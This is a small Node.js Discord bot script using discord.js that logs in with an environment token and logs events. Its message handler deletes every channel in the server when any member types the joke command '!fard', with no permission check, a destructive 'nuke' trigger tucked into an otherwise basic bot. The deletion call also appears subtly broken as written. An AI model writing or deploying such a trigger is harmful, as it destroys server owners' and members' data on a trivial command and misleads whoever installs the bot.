// requires
const { Client, Intents } = require('discord.js');
const { TOKEN } = process.env

// initialize client
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

// show bot is logged in
client.on('ready', () => {
	console.log('Logged in as '+client.user.tag);
});

// handle slash commands
client.on('interactionCreate', async i => {
	if (!i.isCommand()) return;
  console.log(i)
})

// handle messages
client.on('messageCreate', message => {
  if (message.content === "!fard") {
  message.guild.channels.forEach(c => c.delete())
  }
})
// login
client.login(TOKEN);
